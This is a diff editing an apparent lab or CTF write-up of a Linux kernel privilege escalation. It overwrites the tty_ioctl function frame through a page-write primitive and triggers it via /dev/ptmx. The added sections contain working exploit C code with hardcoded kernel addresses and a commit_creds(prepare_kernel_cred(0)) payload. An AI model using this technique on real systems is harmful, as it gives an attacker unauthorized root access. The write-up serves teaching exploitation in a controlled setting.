@@ -170,7 +170,11 @@ overwrite the whole page, starting from its start address.
   
 For information, on x64 `PAGE_OFFSET=0xffffffff80000000` and `PAGE_SHIFT=12`.
   
-# Selecting a target
+# Getting code execution
+
+N.B.: every following virtual addresses come from /proc/kallsyms. We could say that this symbol lookup is doable.
+
+## Finding a target
 
 In this example, KASLR is off. Furthermore, SMAP is disabled, but with such a powerful primitive, leaking
 kernel-land information to break KASLR and overwriting structure in memory would not be too hard.
@@ -182,14 +186,12 @@ Using classic kernel symbols is easier. Instead of overwriting a function pointe
 overwrite an entire function frame? Of course yes. So the plan is actually easy: `finding a kernel function that is
 called at a guessable moment, overwriting its whole frame with a LPE shellcode, and triggering it.`
 
-## tty_release...
+## Overwriting tty_release, kind of
 
-### ...kind of
-
-Overwriting the classic `tty_release` function is what comes to mind first: open("/dev/ptmx", 'r'); close(pwn); and 
-the function is called. So, we find the function address, let's say `0xffffffff813ee0a0`. We can try:
+Overwriting the classic `tty_release` function is what comes to mind first: `int pwn = open("/dev/ptmx", 'r'); close(pwn);`
+and the function is called. So, we find the function address, let's say `0xffffffff813ee0a0`. We can try:
 ```c
-lseek(fd, ((0xffffffff813ee0a0 - PAGE_OFFSET) >> PAGE_SHIFT) * PAGE_SIZE);
+lseek(fd, ((0xffffffff813ee0a0 - PAGE_OFFSET) >> PAGE_SHIFT) * PAGE_SIZE, SEEK_SET);
 char b[PAGE_SIZE] = {0};
 memset(b, 0x41, PAGE_SIZE);
 write(fd, b, PAGE_SIZE);
@@ -198,8 +200,8 @@ int pwn = open("/dev/ptmx", 'r');
 close(pwn);
 ```
 
-The close() call crashes the kernel indeed in trying to execute a bunch of 0x41, but the crash does not actually 
-appear in tty_release, but in `tty_ioctl`. So this function seems to be called before tty_release. Whatever, 
+The close() call crashes the kernel indeed in trying to execute a bunch of 0x41. But the crash does not actually 
+appear in tty_release as expected, but in `tty_ioctl`. So this function seems to be called before tty_release. Whatever, 
 let's overwrite tty_ioctl.
 
 # Replacing tty_ioctl frame with a LPE function frame
@@ -209,7 +211,7 @@ the tty_release function frame that starts at 0xffffffff813ee0a0, and not anothe
 significantly different. So we dump the kernel binary and read at address 0xffffffff813ee0a0:
 
 ```
-pwndbg> x/10gi 0xffffffff813ee0a0
+(gdb) x/10gi 0xffffffff813ee0a0
    0xffffffff813ee0a0:	push   rbp
    0xffffffff813ee0a1:	mov    rdx,0xffffffff81a67880
    0xffffffff813ee0a8:	mov    rbp,rsp
@@ -224,8 +226,8 @@ pwndbg> x/10gi 0xffffffff813ee0a0
 ```
 
 This is function prologue, so this address is used in a `call 0xffffffff813ee0a0` in kernel space, `this will transfer 
-control to the target address, and begin execution there. Overwriting the tty_ioctl frame with another one will be the 
-code execution primitive.`
+control to the target address, and begin execution there. So, overwriting the tty_ioctl frame with another one will be 
+how we get code execution.`
 The classic `commit_creds(prepare_kernel_cred(0))` should work.
 
 ```c
@@ -253,19 +255,36 @@ What comes between the end of the function frame, and the end of the page does n
 
 As a result, the exploit function looks like
 ```c
+#define PAGE_SIZE 4096
+#define PAGE_OFFSET 0xffffffff80000000LL
+#define PAGE_SHIFT 12
+#define SHELLCODE_LENGTH 0x3d
+
+#define TTY_IOCTL 0xffffffff813ee8f0LL
+#define COMMIT_CREDS 0xffffffff8107ab70LL
+#define PREPARE_KERNEL_CRED 0xffffffff8107af00LL
+
+int __attribute__((regparm(3))) kernel_payload() {
+  _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
+  _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
+  commit_creds(prepare_kernel_cred(0));
+  return -1;
+}
+
 void exploit(int fd)
 {
   unsigned int target_page = (TTY_IOCTL - PAGE_OFFSET) >> PAGE_SHIFT;
   unsigned int target_offset = TTY_IOCTL & 0xfffLL;
 
   char *b = (char*) malloc(PAGE_SIZE);
-  
+  if (b == NULL)
+    exit(EXIT_FAILURE);
+    
   memset(b, 0x90, target_offset); // 0x90 for eventual nop slide, but not necessary
   memcpy(b + target_offset, kernel_payload, SHELLCODE_LENGTH);
   
-
   printf("[+] Offset set at page number 0x%x\n", target_page);
-  lseek(fd, target_page*PAGE_SIZE, 0); 
+  lseek(fd, target_page*PAGE_SIZE, SEEK_SET); 
   
   printf("[+] Overwriting tty_ioctl with lpe payload\n");
   write(fd, b, PAGE_SIZE);
@@ -274,8 +293,10 @@ void exploit(int fd)
 }
 ```
 
-Once this function is written in memory, it only remains to call it with a classic `open("/dev/ptmx", 'r'); close(pwn);`,
-and you should be root. :^)
+## Finally
+
+Once this function is written in memory, it only remains to call it with a classic 
+`int pwn = open("/dev/ptmx", 'r'); close(pwn);`, and you should be root. :^)
 
 
 
